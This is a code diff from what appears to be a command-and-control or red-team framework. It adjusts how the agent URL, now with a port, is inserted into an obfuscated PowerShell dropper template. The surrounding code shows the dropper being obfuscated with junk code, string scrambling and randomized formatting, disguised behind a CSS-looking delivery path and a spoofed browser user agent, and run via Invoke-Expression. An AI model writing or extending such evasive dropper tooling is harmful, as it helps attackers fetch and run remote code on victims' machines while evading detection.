@@ -176,17 +176,21 @@ iex ${{VAR_CONTENT}}
             profile = self.config_loader.get_agent_profile_config()
             bind_config = profile.get('bind', {})
             protocol = bind_config.get('protocol', 'http')
-            
+            port = bind_config.get('port', 443 if protocol == 'https' else 80)
+
             http_config = profile.get('http', {})
             user_agent = http_config.get('user_agent', 'Mozilla/5.0')
             uris = http_config.get('uris', [])
             request_headers = http_config.get('request_headers', [])
-            
+
             upstream_config = profile.get('upstream', {})
             hosts = upstream_config.get('hosts', [])
-            
+
             delivery_uri = uris[1] if len(uris) >= 2 else "/assets/css/main.css"
             main_host = hosts[0] if hosts else "localhost"
+
+            default_port = 443 if protocol == 'https' else 80
+            agent_url = server_ip if port == default_port else f"{server_ip}:{port}"
             
             obfuscation_map = self._generate_obfuscation_map()
             
@@ -199,7 +203,7 @@ iex ${{VAR_CONTENT}}
             configured_dropper = self.dropper_template
             configured_dropper = self._apply_obfuscation(configured_dropper, obfuscation_map)
             configured_dropper = configured_dropper.replace(
-                '{{AGENT_URL}}', server_ip
+                '{{AGENT_URL}}', agent_url
             ).replace(
                 '{{DELIVERY_URI}}', delivery_uri
             ).replace(
@@ -218,7 +222,7 @@ iex ${{VAR_CONTENT}}
             
             original_size = len(self._randomize_spacing_and_formatting(self._obfuscate_strings(self._add_junk_code(
                 self._apply_obfuscation(self.dropper_template.replace(
-                    '{{AGENT_URL}}', server_ip
+                    '{{AGENT_URL}}', agent_url
                 ).replace(
                     '{{DELIVERY_URI}}', delivery_uri
                 ).replace(
